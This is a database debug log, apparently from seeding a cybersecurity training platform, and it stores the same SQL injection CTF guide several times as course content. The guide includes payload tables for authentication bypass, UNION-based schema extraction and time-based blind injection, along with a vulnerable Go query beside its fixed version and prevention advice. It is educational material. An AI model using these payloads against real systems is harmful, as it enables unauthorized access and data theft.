| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.518ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.488ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.511','2025-06-09 14:07:53.511',NULL,'social engineering exploits','Psychological manipulation to gain unauthorized access',200,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.396ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.593ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 6 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.010ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.518','2025-06-09 14:07:53.518',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,6) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.519ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.994ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.527','2025-06-09 14:07:53.527',NULL,'ransomware infection scenario','How ransomware encrypts files and demands payment',99,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.680ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.616ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 7 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.604ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.539','2025-06-09 14:07:53.539',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,7) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.438ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.835ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.546','2025-06-09 14:07:53.546',NULL,'sql injection attacks','Exploiting database vulnerabilities through malicious queries',250,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.476ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.487ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 8 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.489ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.554','2025-06-09 14:07:53.554',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,8) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.409ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.097ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.561','2025-06-09 14:07:53.561',NULL,'insider threats and data leaks','Risks posed by employees mishandling sensitive data',200,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.461ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 9 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.156ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.573','2025-06-09 14:07:53.573',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,9) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.898ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.581','2025-06-09 14:07:53.581',NULL,'zero-day exploit awareness','Understanding unknown vulnerabilities before patches exist',90,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.528ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.463ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 10 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

